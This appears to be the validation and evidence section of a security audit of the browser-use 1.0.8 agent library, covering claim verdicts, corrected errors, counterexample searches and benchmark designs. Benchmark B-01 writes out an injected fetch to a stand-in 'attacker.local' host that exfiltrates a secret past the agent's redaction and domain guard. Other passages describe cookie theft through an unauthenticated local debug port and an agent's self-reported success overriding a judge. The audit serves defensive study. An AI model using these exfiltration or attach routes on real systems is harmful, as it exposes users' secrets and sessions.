# 06 Validation & Evidence — browser-use 1.0.8

## 1. Validation verdicts

| KO | Claim | Verdict | Basis |
|---|---|---|---|
| KO-01 | Code-as-action runtime; no DOM/action schema | **CONFIRMED** | Independent IF-01/02; prompt, tool list, absence of serializer, tests |
| KO-02 | Parent/worker/daemon planes with distinct lifecycles | **CONFIRMED** | IF-12; `Repl`, `worker`, `Browser.start`, watchdog |
| KO-03 | Budget-to-delivery ladder | **CONFIRMED** | IF-09/10; `delivery_at`, `python`, `finalizing`, fallback |
| KO-04 | Delivery is a validated contract | **CONFIRMED** | IF-11; split/placeholder/missing-file checks; boundary says lexical |
| KO-05 | Two verdicts; `is_successful()` uses agent verdict; judge not independent | **CONFIRMED** | IF-03/04; `views.py`, `judge.py`, tests |
| KO-06 | Redaction is not isolation | **CONFIRMED** | IF-05/13; env allowlist, `MIGRATING.md`, `test_trust_model...` |
| KO-07 | Navigation allowlist is not network isolation | **CONFIRMED** | IF-06; `domains.py:18-19`, `415` |
| KO-08 | Local control plane is an authority grant | **PARTIALLY_CONFIRMED** | IF-07/08; code has no endpoint auth; “any local account” is documented, not live multi-user tested |
| KO-09 | Two context-degradation paths | **CONFIRMED** | `LazyCompaction`, `Compaction`, prune; tests |
| KO-10 | Managed cloud is the product default runtime | **CONFIRMED** | IF-15; defaults, README, auth, billing lifecycle |
| KO-11 | Action space determines where governance lives (L4) | **PARTIALLY_CONFIRMED** | Supported by the transition and control surfaces; it is an inferred model, not a tested universal |
| KO-12 | Four-boundary confusion model (L4) | **PARTIALLY_CONFIRMED** | Each boundary is evidenced; “often conflated” is a diagnostic hypothesis, not measured |

**Totals**: 9 CONFIRMED, 3 PARTIALLY_CONFIRMED, 0 DOWNGRADED, 0 CONTRADICTED, 0 MISSING, 0 OVER_GENERALIZED, 0 NEEDS_HUMAN_REVIEW.

## 2. Three successful validations

1. **Action-space deletion is real.** The auditor independently found no serializer/action model; `ActionModel` is a removed-name error; the reserved tools are only `python`/`finish`/`finish_from_repl`. This survives a “compatibility name” trap.
2. **The three-plane lifecycle is real.** The auditor independently reconstructed parent → worker → daemon and confirmed the kill/restart semantics: worker variables die, files/browser survive; daemon can be reattached. This is the strongest architecture claim.
3. **The security scope is honestly documented.** The auditor independently found the exact “not a sandbox” language for domain rules, the worker’s parent-key reachability test, and the unauthenticated loopback debug port. The package did not need to infer these; the repo states them.

## 3. Three errors found and corrected

1. **1000 vs 100 step default.** Reading `Session.max_steps=1000` alone would overstate the effective default. `Agent.run(max_steps=100)` passes 100. Corrected in EK-13/KO-03.
2. **Judge → `is_successful()` edge.** An early diagram implied the judge verdict feeds the convenience API. The code has no such edge. Corrected to a dashed “not read” edge in the Evidence Flow.
3. **Attach approval overstatement.** An early phrasing implied every `Browser('chrome')` attach requires a user approval prompt. Approval is conditional; the launched Chromium/profile copy has no gate. Corrected in EK-44.

Additional wording downgrade: “independent judge” was removed everywhere. It is a separate request from the same model over the same trace; only the cached path shares the prefix.

## 4. Omissions and residual risk

- Cloud stop/downloads/keep-alive late paths: partially traced; no live cloud run.
- MCP `browser_exec` thread/cancellation: tool-list and main call path verified; not every blocking edge.
- Real Chrome: 140 `chrome` tests were not run; domain Guard and attach behavior are code/test-documented, not locally exercised.
- 0.13.10 baseline: not re-read line-by-line; the refresh delta relies on the old corpus metadata plus 1.0 docs/code.
- Telemetry: payload construction sampled, not exhaustively audited.
- CLI skill-install/doctor: sampled.
- **Auditor independence**: same runtime/model as the primary pass. Role separation and fresh commands reduce, but do not eliminate, shared-bias risk.

## 5. Counterexample search

| KO | Counterexample attempted | Result |
|---|---|---|
| KO-01 | Is there a hidden action schema behind the facade? | No; `Tools` only registers functions; `ActionModel` raises. Confirmed. |
| KO-02 | Can the worker read the parent’s keys, invalidating “isolation”? | Yes; the claim is lifecycle separation, not confidentiality. Boundary preserved. |
| KO-03 | Does a short timeout skip delivery? | No; `delivery_at` leaves at least half the budget. Confirmed. |
| KO-04 | Does a fabricated but non-empty value pass? | Yes; check is structural/lexical. Boundary preserved, not a contradiction. |
| KO-05 | Can judge override `success`? | No; `is_successful()` reads only `success`. Confirmed. |
| KO-06 | Can a secret be exfiltrated despite redaction? | Yes, via screenshots/`js()`/files/transforms. Boundary preserved. |
| KO-07 | Can a subresource `fetch()` bypass the domain guard? | Yes; code says iframes/subresources pass. Confirmed. |
| KO-08 | Does the 0700 runtime dir prevent cross-user attach? | It prevents socket planting, not connecting to the Chrome port. Boundary preserved. |
| KO-09 | Can compaction lose evidence? | Yes; summary is lossy, archive retains raw evidence but is not re-injected. Boundary preserved. |
| KO-10 | Can a user avoid the cloud default? | Yes, by passing a local Browser/model. Default is a distribution choice, not a hard dependency. Boundary preserved. |
| KO-11 | Is a code agent with a container safer than a typed-action agent? | Yes, possible; the model is about *where* governance lives, not its strength. Boundary preserved. |
| KO-12 | Are the four boundaries mutually exclusive? | No; they interact. Boundary preserved. |

## 6. Benchmark cases

### B-01 — Redaction vs exfiltration
**Setup**: container with two hosts: `allowed.local` (allowed) and `attacker.local` (not allowed). Task requires reading a secret from an env var, then visiting `allowed.local` with an injected `fetch('http://attacker.local/?s=...')`.
**Expected**: worker can read the secret; redactor hides it from stdout; Guard does not block the subresource `fetch`; the exfiltration succeeds unless an external network policy blocks it.
**What it tests**: KO-06, KO-07, KO-12; the difference between “not printed” and “not exfiltrated”.
**Metric**: secret-in-attacker-log (0/1), secret-in-model-output (0/1), blocked-subresource (0/1).

### B-02 — Judge authority divergence
**Setup**: scripted model calls `finish(success=True)` while the final page shows a failure; judge enabled.
**Expected**: `result.success=True`, `result.judgement.success=False`, `is_successful()=True`.
**What it tests**: KO-05; whether callers can see the disagreement and whether the convenience API hides it.
**Metric**: three-way agreement rate on a labelled set of failed runs.

### B-03 — Local attach exposure
**Setup**: two local UIDs on one host; UID A runs `Browser('chromium')`; UID B attempts to connect to the discovered `ws://127.0.0.1:<port>`.
**Expected**: UID B can connect if loopback is shared and permissions allow; no token is required.
**What it tests**: KO-08; whether “local” is an authority boundary.
**Metric**: attach success, cookie read success, time window with `keep_alive`.

## 7. Evidence map

| Evidence area | Files |
|---|---|
| Architecture / facade | `agent/service.py`, `agent/views.py`, `legacy.py`, `AGENTS.md`, `MIGRATING.md` |
| Loop / budgets / delivery | `agent/loop.py`, `tests/ci/test_loop.py` |
| Judge | `agent/judge.py`, `tests/ci/test_judge.py` |
| REPL / secrets | `repl/session.py`, `repl/worker.py`, `tests/ci/test_repl.py` |
| Browser / local / cloud | `browser/browser.py`, `browser/local.py`, `tests/ci/test_browser.py`, `README.md` |
| Domains | `domains.py`, `tests/ci/test_domains.py`, `MIGRATING.md` |
| Tools / MCP / CLI | `tools.py`, `mcp/cli_mcp.py`, `cli.py`, `tests/ci/test_compat.py` |
| Context / compaction | `agent/loop.py`, `tests/ci/test_loop.py` |
| Telemetry / auth | `config.py`, `telemetry/service.py`, `auth.py` |
| CI | `.github/workflows/test.yaml`, `package.yaml`, `docker.yml`, `lint.yml`, `install-script.yml` |

## 8. Gate result

- Truth gate: **PASS** (9 confirmed, 3 partial, 0 contradicted).
- Coverage gate: **PARTIAL** — core runtime, security, delivery, and context covered; cloud/MCP/CLI late paths and real Chrome not fully exercised.
- Flow gate: **PASS** — all seven flows traced to symbols/conditions; one diagram edge corrected.
- Abstraction gate: **PASS with scope** — 10 L3, 2 L4, 0 L5; L4 models labeled as models, not facts.
- Counterexample gate: **PASS** — every KO has an attempted counterexample or explicit boundary.
- Epistemic gate: **PASS** — no Hypothesis presented as Fact; no cross-project candidate promoted to Principle.
